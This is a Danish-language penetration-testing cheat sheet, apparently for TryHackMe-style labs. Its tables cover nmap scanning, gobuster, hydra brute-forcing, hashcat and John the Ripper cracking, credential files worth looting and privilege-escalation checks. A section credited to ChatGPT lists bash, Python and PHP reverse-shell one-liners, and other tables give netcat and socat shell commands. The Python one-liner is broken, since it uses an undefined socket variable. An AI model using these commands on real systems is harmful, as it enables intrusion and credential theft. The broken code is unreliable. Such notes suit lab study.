| Kommando           | Beskrivelse                                                 | Vigtige Flags                                                     |
|--------------------|-------------------------------------------------------------|-------------------------------------------------------------------|
| `nc -lvnp 443`     | Starter en Netcat-lytter på port 443 (typisk til reverse shell). | `-l`: Lytter efter indgående forbindelser.<br>`-v`: Verbose (viser detaljer).<br>`-n`: Ingen DNS-opslag.<br>`-p`: Angiver specifik port. |
| `rlwrap [kommando]`| Tilføjer readline-funktionalitet (historik, autocomplete) til terminalprogrammer. | Ingen essentielle flags.<br>Eksempelbrug: `rlwrap nc -lvnp 443` |
| `ncat [host] [port]`| Forbedret udgave af Netcat med bl.a. SSL-understøttelse og avancerede features. | `-l`: Lytter.<br>`-v`: Verbose.<br>`--ssl`: Bruger SSL-forbindelse.<br>`-e [program]`: Udfører program/shell ved forbindelse (typisk til reverse shells). |
| `socat [parametre]`| Avanceret værktøj til netværksoperationer, tunneling og shells. | Eksempel reverse shell:<br>`socat TCP-L:[port] -` (lyt)<br>`socat TCP:[ip]:[port] EXEC:/bin/bash` (connect til remote shell). |



| Kommando | Beskrivelse | Vigtige Flags |
|----------|-------------|---------------|
| `gobuster --help` | Viser hjælp og alle muligheder i Gobuster. | Ingen flags nødvendige |
| `gobuster dir -u "http://www.example.thm" -w /path/to/wordlist` | Scanner URL for skjulte mapper/filer (directory brute-force). | `dir`: Directory scan-mode.<br>`-u`: URL til målet.<br>`-w`: Angiver sti til wordlist. |
| `gobuster dir -u "http://www.example.thm" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r` | Directory scanning med udvidet wordlist og følger redirects (omdirigeringer). | `-r`: Følg HTTP redirects.<br>`-w`: Wordlist-sti. |
| `gobuster vhost -u "http://MACHINE_IP" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320` | Scanner efter virtuelle hosts/subdomæner på målet. | `vhost`: Virtual host scan-mode.<br>`--domain`: Angiver hoveddomænet.<br>`--append-domain`: Tilføjer domænet til resultaterne.<br>`--exclude-length`: Ekskluderer svar af bestemt længde (fx fejlmeldinger). |



| Kommando | Beskrivelse | Vigtige Flags |
|----------|-------------|---------------|
| `hashcat` | Password-cracking værktøj, understøtter mange algoritmer og angrebsmetoder. | `-m`: Hash-algoritme (f.eks. `-m 3200` er bcrypt).<br>`-a`: Angrebsmodus (f.eks. `0` dictionary attack, `3` brute force). |
| `hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` | Bruger Hashcat med dictionary-angreb på hashes af typen bcrypt. | `-m 3200`: bcrypt hashes.<br>`-a 0`: Dictionary-angreb (ordliste).<br>`hash.txt`: Fil med hash-værdier.<br>`rockyou.txt`: Standard ordliste til password cracking. |
| `john hash.txt` | Simpelt password cracking med John the Ripper. | Ingen flags (simpel cracking). |
| `john --wordlist=/path/to/wordlist.txt hash.txt` | Dictionary-angreb med ordliste. | `--wordlist`: Angiver ordliste (dictionary attack). |
| `john --format=bcrypt hash.txt` | Password cracking med specifik algoritme (bcrypt). | `--format`: Angiver hash-algoritme (f.eks. bcrypt, md5, sha256). |
| `john --show hash.txt` | Viser crackede passwords fra John the Ripper. | `--show`: Vis crackede passwords. |



| Kommando                                        | Beskrivelse                                                | Vigtige Flags                                                 |
|-------------------------------------------------|------------------------------------------------------------|---------------------------------------------------------------|
| `nmap -sV -sC <ip>`                             | Scanner åbne porte, services og udfører standard scripts.  | `-sV`: Version detection (service/version).<br>`-sC`: Kører standard NSE-scripts.  |
| `gobuster dir -u <url> -w <wordlist>`           | Scanner URL for skjulte mapper/filer.                      | `dir`: Directory scan-mode.<br>`-u`: URL.<br>`-w`: Wordlist.  |
| `enum4linux <ip>`                               | Udfører SMB/Samba enumeration (brugerinfo, shares).        | Ingen nødvendige flags (standard scan).                       |
| `hydra -l <user> -P <wordlist> <ip> <service>`  | Brute-force login mod service med ordliste.                | `-l`: Specificér enkelt username.<br>`-P`: Ordlistens sti.    |
| `ssh -i <id_rsa> <user>@<ip>`                   | Opretter SSH-forbindelse med privat nøgle (id_rsa).        | `-i`: Angiver privat nøgle-fil (id_rsa).                      |
| `ssh2john <id_rsa> > <hash_name>`               | Konverterer SSH-privatnøgle til format for John the Ripper.| Ingen ekstra flags nødvendige (output omdirigeres til fil).   |
| `john --wordlist=<wordlist> <hash_name>`        | Cracker SSH-privatnøgle (password) med ordliste.           | `--wordlist`: Bruger angivet ordliste til cracking.           |
| `cat /etc/passwd`                               | Viser systemets brugere og deres login-shells.             | Ingen flags nødvendige (simpel filvisning).                   |



| Kommando                          | Beskrivelse                                | Vigtige Flags                                 |
|-----------------------------------|--------------------------------------------|-----------------------------------------------|
| `nmap -sT MACHINE_IP`             | TCP Connect Scan, udfører fuld TCP-handshake, nemmere at opdage. | `-sT`: TCP Connect scan.                      |
| `sudo nmap -sS MACHINE_IP`        | TCP SYN Scan (stealth-scan), hurtigt og mindre synligt for IDS/firewalls. | `-sS`: TCP SYN (stealth scan).                |
| `sudo nmap -sU MACHINE_IP`        | UDP Scan, scanner for åbne UDP-porte.      | `-sU`: UDP Scan. (Langsom scanningstype).     |



| Option                     | Beskrivelse                                           |
|----------------------------|-------------------------------------------------------|
| `-p-`                      | Scanner **alle 65535 porte**.                          |
| `-p1-1023`                 | Scanner **porte 1 til 1023** (velkendte porte).        |
| `-F`                       | Scanner kun de **100 mest almindelige porte**.         |
| `-r`                       | Scanner porte i **rækkefølge (ikke tilfældigt)**.      |
| `-T<0-5>`                  | Justerer scanning-hastighed (**T0 langsomst, T5 hurtigst**). |
| `--max-rate 50`            | Maks. **50 pakker pr. sekund** sendes under scanning.  |
| `--min-rate 15`            | Mindst **15 pakker pr. sekund** sendes under scanning. |
| `--min-parallelism 100`    | Mindst **100 parallelle scanninger** samtidig.         |



| Fil/Placering                   | Hvorfor er den interessant?                      |
|---------------------------------|--------------------------------------------------|
| `/etc/passwd`                   | Indeholder systemets brugere og deres shells, home-dirs m.m. |
| `/etc/shadow`                   | Indeholder hashede brugerpasswords. Kræver typisk root. |
| `/etc/crontab`                  | Kan indeholde automatiserede opgaver, som muligvis kan misbruges (privilege escalation). |
| `/home/*`                       | Brugernes hjemmemapper indeholder typisk personlige filer, noter, konfigurationsfiler eller nøgler. |
| Konfigurationsfiler for services (fx `/etc/php.ini`, `/etc/mysql/my.cnf`) | Kan indeholde credentials og nyttige oplysninger om opsætning og sikkerhed. |
| Databasefiler (fx `/var/lib/mysql/*`) | Mulige adgangskoder, følsomme oplysninger og værdifulde data. |
| SSH-nøgler (`~/.ssh/id_rsa`)    | Privatnøgler, som kan bruges til adgang via SSH. |
| Shell history (`~/.bash_history`) | Tidligere kommandoer kørt af brugeren; kan afsløre passwords, filer eller interne services. |



| Kommando                               | Beskrivelse (hvad gør kommandoen?)                               |
|----------------------------------------|-------------------------------------------------------------------|
| `uname -a`                             | Viser information om systemet (OS, kerneversion m.m.).            |
| `cat /etc/issue`                       | Viser information om operativsystemets distribution.              |
| `cat /etc/passwd`                      | Lister alle systembrugere.                                        |
| `sudo -l`                              | Viser hvilke kommandoer brugeren kan køre med root/sudo-rettigheder. |
| `id`                                   | Viser nuværende brugers ID samt gruppetilhørsforhold.             |
| `crontab -l`                           | Lister cronjobs (planlagte opgaver) for nuværende bruger.         |
| `cat /etc/crontab`                     | Viser systemets cronjobs, som muligvis kører med højere privilegier. |
| `find / -perm -4000 2>/dev/null`       | Finder alle filer med SUID-bit sat (kan udnyttes til privilege escalation). |
| `cat /etc/sudoers`                     | Viser konfiguration af sudo-privilegier på systemet.              |



EKSTRA FRA CHATGPT:
| Reverse Shell Eksempler | Beskrivelse |
|-------------------------|-------------|
| `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | Enkel bash reverse shell |
| `python3 -c 'import socket,subprocess,os;socket.socket(socket.AF_INET,socket.SOCK_STREAM).connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` | Python reverse shell (lang version) |
| `php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&1");'` | PHP reverse shell |



| Kommando              | Beskrivelse                             | Nyttige flags                         |
|-----------------------|-----------------------------------------|---------------------------------------|
| `ls`                  | Lister filer og mapper                   | `-l`: detaljeret visning<br>`-a`: vis skjulte filer |
| `pwd`                 | Viser nuværende mappe                    | Ingen flags nødvendige                |
| `cd <mappe>`          | Skifter mappe                            | Brug `..` for mappe op                |
| `cat <fil>`           | Viser indhold af en fil                  | Ingen flags nødvendige                |
| `nano <fil>`          | Enkel teksteditor til at redigere filer  | Ingen flags nødvendige                |
| `touch <fil>`         | Opretter tom fil                         | Ingen flags nødvendige                |
| `mkdir <mappe>`       | Opretter en ny mappe                     | `-p`: opretter mellemmapper           |
| `rm <fil>`            | Sletter fil                              | `-r`: rekursivt (mapper)<br>`-f`: tvinger sletning |
| `cp <fra> <til>`      | Kopierer filer og mapper                 | `-r`: kopierer mapper                 |
| `mv <fra> <til>`      | Flytter eller omdøber filer/mapper       | Ingen flags nødvendige                |
| `grep <søgetekst> <fil>` | Søger efter tekst i fil(er)           | `-i`: ignorer store/små bogstaver<br>`-r`: rekursiv søgning |
| `chmod <rettigheder> <fil>` | Ændrer filrettigheder              | Eksempel: `chmod +x fil.sh` (gør fil eksekverbar) |
| `chown <bruger>:<gruppe> <fil>` | Ændrer ejer og gruppe af fil   | Eksempel: `chown root:root fil.txt`   |
| `ps aux`              | Viser aktive processer                   | Ingen flags nødvendige                |
| `kill <PID>`          | Dræber en proces (efter ID)              | Eksempel: `kill 1234`                 |
| `whoami`              | Viser nuværende brugernavn               | Ingen flags nødvendige                |
| `ifconfig` eller `ip a`| Viser netværksinformation               | Ingen flags nødvendige                |
| `wget <url>`          | Downloader fil fra URL                   | `-O`: gem fil med bestemt navn        |
| `curl <url>`          | Henter data eller filer fra URL          | `-o`: gem data til en fil             |
| `scp <fil> bruger@host:/sti` | Kopierer filer over SSH           | Eksempel: `scp data.txt user@192.168.1.10:/tmp/` |

